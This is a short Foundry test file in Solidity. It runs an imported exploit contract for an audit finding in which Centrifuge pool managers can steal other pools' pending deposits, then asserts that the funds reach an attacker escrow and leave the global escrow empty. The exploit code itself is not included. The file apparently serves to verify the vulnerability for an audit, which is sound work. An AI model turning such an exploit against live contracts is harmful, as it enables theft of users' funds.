// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "./64195-h-1-pool-managers-can-steal-all-other-pools-pending-deposits.sol";

contract CentrifugeManagerSwapTest is Test {
    function test_exploit() public {
        Exploit e = new Exploit();
        e.run();

        assertEq(e.tok().balanceOf(e.attackerEscrow()), e.DEPOSIT(), "stolen");
        assertEq(e.tok().balanceOf(address(e.globalEscrow())), 0, "escrow empty");
    }
}
